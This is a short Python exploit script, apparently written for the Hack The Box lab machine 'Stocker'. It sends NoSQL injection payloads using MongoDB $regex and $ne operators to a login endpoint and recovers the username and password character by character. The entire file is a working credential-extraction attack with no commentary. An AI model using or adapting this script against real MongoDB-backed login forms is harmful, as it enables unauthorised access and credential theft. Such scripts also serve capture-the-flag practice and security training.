#!/usr/bin/env python3

import requests

from pwn import log, string


def try_data(data) -> bool:
    r = requests.post(
        'http://10.10.11.196/login',
        json=data,
        headers={'Host': 'dev.stocker.htb'},
        allow_redirects=False
    )

    return '/stock' in r.text


def find_value(name: str, try_function):
    prog = log.progress(name)
    value = ''
    found = True

    while found:
        found = False

        for c in string.digits + string.ascii_letters:
            if try_function(value + c):
                value += c
                prog.status(value)
                found = True
                break

    prog.success(value)


def try_username(u: str) -> bool:
    return try_data({'username': {'$regex': f'^{u}.*'}, 'password': {'$ne': 1}})


def try_password(p: str) -> bool:
    return try_data({'username': {'$ne': 1}, 'password': {'$regex': f'^{p}.*'}})


def main():
    find_value('Username', try_username)
    find_value('Password', try_password)


if __name__ == '__main__':
    main()
